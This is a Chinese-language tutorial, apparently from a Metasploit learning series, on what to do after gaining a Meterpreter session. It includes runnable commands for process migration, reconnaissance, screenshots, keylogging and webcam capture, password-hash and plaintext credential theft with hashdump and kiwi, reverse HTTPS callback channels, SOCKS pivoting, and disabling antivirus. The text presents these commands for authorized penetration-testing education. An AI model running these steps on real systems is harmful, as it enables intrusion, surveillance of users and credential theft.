---
title: Meterpreter 会话：拿到 shell 后你能做什么
description: 拆解 Metasploit 的 Meterpreter——为什么它比普通 shell 强，会话建立后怎么迁移进程、做基础信息收集（sysinfo/ps/getuid）、截图与键盘记录、抓取密码哈希，以及会话的挂起与多会话管理。
category: security
subcategory: msf
tags: ['Metasploit', 'Meterpreter', '后渗透', '会话', '哈希抓取']
pubDate: 2026-07-19
order: 4
---

上篇你用 exploit 拿到了一个会话。如果 payload 是 Meterpreter，那恭喜——你拿到的不是普通命令行，而是一个**功能丰富的"远程控制客户端"**。Meterpreter 跑在目标内存里（不落盘或很少落盘），能迁移进程、截图、记录键盘、抓密码哈希、开代理……这一篇把拿到 Meterpreter 后最常用、最入门的操作过一遍。

> 本文所有操作仅用于你对**自有或已授权**的目标。在他人系统抓取凭据、截屏等属违法。

## 为什么 Meterpreter 比普通 shell 强

普通 `cmd`/`sh` 反弹 shell 只是个命令行；Meterpreter 是 MSF 自带的一套**内存中的客户端-服务端**：

- 它用反射 DLL 注入等方式加载到目标进程内存，**磁盘上不一定有文件**，更 stealthy。
- 所有命令通过加密通道和你通信，支持**动态加载扩展**（如 `priv`、`kiwi` 提权/抓密码模块）。
- 可以**迁移进程**、**通道化**（把目标变成你访问内网的跳板）。

一句话：普通 shell 是"能敲命令"，Meterpreter 是"整套后渗透工具箱"。

## 会话建立后先看什么

会话一开，先确认"我是谁、在哪台机器"：

```text
meterpreter > sysinfo          # 系统信息：OS、架构、计算机名
meterpreter > getuid           # 当前权限：是谁（如 NT AUTHORITY\SYSTEM 还是普通用户）
meterpreter > ps               # 进程列表：看有什么进程可迁移
meterpreter > pwd / ls / cat   # 基础文件操作（和 Linux 命令类似）
meterpreter > ipconfig         # 网络配置：看目标在内网里的位置
```

`getuid` 特别重要：如果显示是 `SYSTEM` 或 `root`，你已经有了最高权限；如果是普通用户，下一步要考虑**提权**（后面内网篇会讲）。

## 进程迁移：让 shell 更稳更隐蔽

Meterpreter 默认附着在漏洞利用时创建的进程里（比如某个会崩溃的服务进程）。一旦那个进程关掉，你的会话就断了。所以**拿到会话第一件事常是迁移到一个稳定进程**（如 `explorer.exe`、`lsass.exe` 之外更稳的）：

```text
meterpreter > ps                # 找 explorer.exe 的 PID，比如 1234
meterpreter > migrate 1234      # 把 Meterpreter 迁移过去
# 或让 MSF 自动迁移到更稳的进程
meterpreter > run post/windows/manage/migrate
```

迁移后即使原漏洞进程退出，你的控制也不丢。

## 基础信息收集

Meterpreter 内置一堆信息收集命令，比手动敲快得多：

```text
meterpreter > screenshot        # 截当前桌面（直观看用户在干嘛）
meterpreter > webcam_snap       # 调摄像头拍照（仅授权且设备存在时）
meterpreter > keylogger_start   # 开始记录键盘（慎用，合规要求高）
meterpreter > enum_logged_on_users   # 列出登录过的用户
meterpreter > arp               # 看 ARP 表，发现内网其他主机
meterpreter > route             # 看当前路由，后面开代理要用
```

注意：`keylogger`、`webcam` 这类涉及隐私的命令，**只在书面授权且范围明确时**使用，并在报告里如实记录——这是职业渗透的底线。

## 抓取密码哈希

拿到一定权限后，常需要抓本机凭据，为后续横向移动做准备。Windows 下用 `hashdump` 或功能更强的 `kiwi`（mimikatz 的 MSF 版）：

```text
meterpreter > hashdump          # 导出 SAM 里的密码哈希（需够权限）
meterpreter > load kiwi         # 加载 kiwi 扩展
meterpreter > kiwi_cmd sekurlsa::logonpasswords   # 尝试抓明文密码（需 SYSTEM）
```

`hashdump` 给的是 NTLM 哈希，拿到后可以用 `john`/`hashcat` 离线爆破，或用于 **Pass the Hash**（拿哈希直接登录，不解密）。`kiwi` 在目标还是交互登录状态时，甚至可能直接拿到明文密码。

## 会话的挂起、切换与多目标

一次渗透可能同时控了好几台机器。MSF 用"会话 ID"管理：

```text
msf6 > sessions                 # 列出所有活跃会话及编号
msf6 > sessions -i 1            # 进入 1 号会话（回到 meterpreter）
msf6 > sessions -u 1            # 把 1 号普通会话升级成更稳的 Meterpreter（如适用）
msf6 > background               # 从 meterpreter 退回 msfconsole，会话挂起保留
```

`background` 很常用：你在一个 Meterpreter 里干完活，退回控制台去跑别的模块，会话还在后台，随时 `sessions -i` 回来。

## 常见新手坑

- **没迁移进程，会话莫名断了**：漏洞进程一崩，shell 就没了，记得早点 `migrate`。
- **权限不够就 hashdump**：提示拒绝访问，说明要先提权到 SYSTEM（见内网篇）。
- **把隐私类命令当常规用**：`keylogger`/`webcam` 合规门槛高，别滥用，报告里要透明。
- **忘了 background**：一直停在 meterpreter 里，以为不能干别的，其实 `background` 就能回控制台。

## 进阶：Meterpreter 的通道化与代理

Meterpreter 有个强大但入门容易忽略的能力——**通道化（transport）**。你可以给同一个会话加多个"回连通道"（如主用 TCP、备用 HTTPS），一条断了自动切另一条，提高存活率：

```text
meterpreter > transport list          # 看当前通道
meterpreter > transport add -t reverse_https -l <IP> -p 8443 -y 30   # 加备用 HTTPS 通道
```

更实用的是拿 Meterpreter 当** SOCKS 代理跳板**：在 meterpreter 里 `run socks_proxy` 起一个本地 SOCKS，你本机的其他工具（浏览器、nmap、Impacket）就能经这条会话访问目标内网——这正是内网横向的常用起手式（详细见内网篇）。

```text
meterpreter > run socks_proxy -i 1 -p 1080   # 本地 1080 起 SOCKS，流量经此会话进内网
```

## 实战：拿到会话后的标准操作清单

把前面零散命令串成一份"拿到 Meterpreter 会话后该干嘛"的清单，照着走：

```text
meterpreter > sysinfo            # 1) 系统/架构/计算机名
meterpreter > getuid             # 2) 当前权限（SYSTEM 还是普通用户）
meterpreter > ps                 # 3) 进程列表，找稳定进程（如 explorer.exe）
meterpreter > migrate <pid>      # 4) 迁移过去，避免会话随漏洞进程退出而断
meterpreter > getuid             # 5) 再确认权限（迁移不改变权限）
meterpreter > ipconfig           # 6) 看目标在内网的 IP/网关，定位内网段
meterpreter > arp                # 7) ARP 表，发现同网段其他主机
meterpreter > screenshot         # 8) 截桌面，直观看用户环境
meterpreter > hashdump           # 9) 抓本地哈希（需够权限），为横向备料
meterpreter > background         # 10) 挂起会话，回控制台跑别的模块
```

这份清单的顺序有讲究：先**认清身份与环境**（1-2），再**稳住会话**（3-4），然后**收集内网情报与凭据**（5-9），最后**挂起去做别的**（10）。养成固定顺序，既不漏步也不乱。

## Meterpreter 的 post 扩展模块一览

Meterpreter 不止手动敲命令，`post/` 下大量脚本能一键做复杂动作。几个最实用的：

- **`post/multi/recon/local_exploit_suggester`**：自动比对当前系统的补丁，列出**可用的本地提权 exploit**——提权前先跑它，省去手工翻 systeminfo。
- **`post/windows/gather/enum_logged_on_users`**：列出登录过的用户，发现潜在目标账号。
- **`post/windows/gather/enum_applications`**：装了哪些软件，找提权/漏洞面。
- **`post/windows/manage/migrate`**：自动迁移到稳定进程。
- **`post/multi/manage/autoroute`**：加内网路由（跳板，见后渗透篇）。
- **`post/windows/manage/killav` / `post/windows/manage/enable_rdp`**：临时停杀软、开 RDP（仅授权范围）。

用法统一：`run post/...`，部分需先 `set SESSION <id>`。这些脚本本质是"把常见后渗透动作自动化"，熟练后你能自己写 `.rc` 串起多个，批量执行。

## Meterpreter 与 CS Beacon 的取舍

你可能会疑惑：Meterpreter 和 CS 的 Beacon 都能"控制机器"，区别在哪、用哪个？

- **来源不同**：Meterpreter 是 MSF 利用成功后产生的会话；Beacon 是 CS 生成、靠投递上线的信标。
- **生态不同**：Meterpreter 直接调 MSF 的 `post/` 模块、和 `multi/handler` 天然配合；Beacon 在 CS 的团队协作、GUI、流量伪装生态里更顺。
- **会话互通**：两者能互转——MSF 会话可 `payload_inject` 派生成 Beacon；Beacon 可 `spawn` 到 foreign listener 变成 Meterpreter（见 CS 篇）。
- **怎么选**：你用 MSF 打下的初始入口，自然先用 Meterpreter；若项目用 CS 做长期控制与多人协作，就把会话派生成 Beacon。不必二选一，按手头的框架和任务选。

一句话：**Meterpreter 是 MSF 的"控制终端"，Beacon 是 CS 的"潜伏信标"，能力重叠但生态不同，且能互相转换。**

## 速记：Meterpreter 日常五件事

拿到会话后，最常用就这五件事，记住它们就够日常用：

1. **`sysinfo`**：我是哪台机器、什么系统。
2. **`getuid`**：我是谁、什么权限。
3. **`ps` + `migrate`**：找稳定进程并迁过去，防掉线。
4. **`hashdump` / `kiwi`**：抓本机凭据，备横向。
5. **`screenshot` / `arp` / `route`**：看桌面、看同网段、看路由，为下一步铺路。

这五件事覆盖了"站稳 + 收情报 + 备横向"的基本面。更复杂的 `post/` 模块是这五件的自动化升级版。

## Meterpreter 的局限

Meterpreter 很强，但不是魔法，知道它的边界能少走弯路：

- **依赖初始利用成功**：Meterpreter 是 payload，得先有 exploit 打开口子、且目标能回连，它才出现。利用失败，Meterpreter 无从谈起。
- **怕杀软**：Meterpreter 的 stage 下载、内存特征常被 EDR 识别，裸用易被拦（免杀见内网篇）。
- **权限受限于会话**：没提权时很多命令（hashdump、读系统文件）会被拒，要先提权。
- **Windows 最完善**：Meterpreter 对 Windows 功能最全；Linux 也有 `meterpreter`/`shell` 但部分扩展（如 `kiwi`）是 Windows 专属。
- **有网络特征**：Meterpreter 的通信模式、证书可被网络检测识别，真实对抗要加密通道（HTTPS）配合。

所以 Meterpreter 是"利器"不是"万能"，实战里它和 CS Beacon、手工操作、各类脚本配合使用，各取所长。

## 常见误区

- **"Meterpreter 一定比 cmd shell 好"**：只要简单命令通道时，纯 shell 更轻、特征更少，按需选。
- **"迁移会丢权限"**：迁移是同一会话换宿主进程，权限不变，只是更稳。
- **"keylogger 随便开"**：涉及隐私，合规门槛高，仅明确授权范围使用并透明记录。
- **"抓到哈希就完事"**：哈希要用于 PtH 或破解才有价值，别只收集不利用。

## 自测题

1. 为什么说 Meterpreter 比普通 shell "stealthy"？
2. 进程迁移（migrate）解决什么问题？会不会丢权限？
3. `hashdump` 和 `kiwi` 抓凭据的前提分别是什么？
4. Meterpreter 的 `socks_proxy` 在内网渗透里起什么作用？

## 这一篇你该记住的

- Meterpreter 是"内存中的后渗透工具箱"，比普通 shell 强在 stealthy、可加载扩展、可做跳板。
- 进会话先 `sysinfo`/`getuid`/`ps`/`ipconfig` 摸清"我是谁、在哪"。
- 拿到会话尽早 `migrate` 到稳定进程，避免漏洞进程退出导致会话断。
- 信息收集用 `screenshot`/`arp`/`enum_logged_on_users`；抓凭据用 `hashdump` 或 `kiwi`（需够权限）。
- 多会话用 `sessions -i <id>` 切换，`background` 挂起回控制台。隐私类命令仅限明确授权范围。

下一篇是 MSF 基础系列的收尾——**后渗透基础**：怎么在目标上做系统信息收集、留持久化后门、开路由把目标当内网跳板，以及怎么把整个行动整理成可交付的记录。之后你就有了从"打进去"到"站稳脚"的完整能力。